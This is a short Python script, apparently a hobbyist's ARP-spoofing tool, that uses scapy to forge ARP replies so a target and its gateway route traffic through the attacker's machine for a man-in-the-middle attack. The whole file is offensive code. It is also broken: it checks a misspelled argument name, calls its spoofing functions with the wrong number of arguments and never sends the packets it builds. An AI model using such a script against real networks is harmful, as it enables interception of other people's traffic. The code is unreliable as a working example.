#!/usr/bin/env python3

import subprocess
import scapy.all as scapy
import argparse
import re

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="mitm_interface", help="Attacker's interface to execute Man-in-the-Middle (MITM) attack (i.e. eth0)")
    parser.add_argument("-t", "--target", dest="target_ip", help="Target's IP address (i.e. 10.1.1.15)")
    parser.add_argument("-tm", "--target-mac-address", dest="target_mac", help="Target's MAC Address (i.e. aa:bb:cc:dd:ee:ff)")
    parser.add_argument("-g", "--gateway", dest="gateway_ip", help="Gateway IP address of Target (i.e. 10.1.1.1)")
    parser.add_argument("-gm", "--gateway-mac-address", dest="gateway_mac", help="Gateway's MAC Address (i.e. ff:ee:dd:cc:bb:aa)")
    options = parser.parse_args()
    if not options.mitm_interface:
        parser.error("[-] Please specify an interface to execute the attack from, see --help for more info.")
    if not options.target_ip:
        parser.error("[-] Please specify a target IP address, see --help for more info.")
    if not options.targetmac:
        parser.error("[-] Please specify a target MAC Address, see --help for more info.")
    if not options.gateway_ip:
        parser.error("[-] Please specify a gateway IP address, see --help for more info.")
    if not options.gateway_mac:
        parser.error("[-] Please specify a gateway MAC Address, see --help for more info.")
    return options

def mitm_mac(mitm_interface):
    parse_mac = argparse.ArgumentParser()
    ifconfig_snapshot = subprocess.check_output(["ifconfig", mitm_interface])
    mitm_mac_address = re.findall(r"\w\w:\w\w:\w\w:\w\w:\w\w:\w\w", str(ifconfig_snapshot))[0]
    return mitm_mac_address


def arp_spoof_target(target_ip, target_mac, gateway_ip):
    packet = scapy.ARP(op=2, pdst=str(target_ip), hwdst=(target_mac), psrc=(gateway_ip))


def arp_spoof_gateway(target_ip, gateway_mac, gateway_ip):
    packet = scapy.ARP(op=2, pdst=str(gateway_ip), hwdst=(gateway_mac), psrc=(target_ip))

# target_ip = input("Target IP Address: ")
# target_mac = input("Target MAC Address: ")
# gateway_ip = input("Gateway IP Address to spoof: ")
# gateway_mac = input("Gateway MAC Address: ")


options = get_arguments()
print("[ ] Script Started.")
print("[+] Querying for MAC Address..")
mitm_mac_address = mitm_mac(options.mitm_interface)
print("[+] Spoofing Target..")
arp_spoof_target(options.target_ip, options.target_mac, options.gateway_ip, mitm_mac_address)
print("[+] Spoofed Target!")
print("[+] Spoofing Gateway..")
arp_spoof_gateway(options.target_ip, options.target_mac, options.gateway_ip, options.gateway_mac)
print("[+] Spoofed Gateway!")
print("[X] Script completed!")